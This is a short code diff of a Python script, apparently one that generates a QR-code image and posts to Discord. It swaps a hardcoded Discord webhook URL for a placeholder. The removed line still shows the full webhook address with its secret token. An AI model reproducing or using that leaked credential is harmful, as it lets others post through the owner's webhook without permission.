@@ -7,7 +7,7 @@ import os
 import requests
 import json
 
-WEBHOOK_URL = 'https://discord.com/api/webhooks/844975531853086741/2NoeS4owsPHtN6JsHRXdX9hHFDjveJRscP2jmid8pnuQUAPJkSHyMjz-ZnlQNnkYpBMY'
+WEBHOOK_URL = '<your webhook url>'
 
 def logo_qr():
     im1 = Image.open('temp/qr_code.png', 'r')
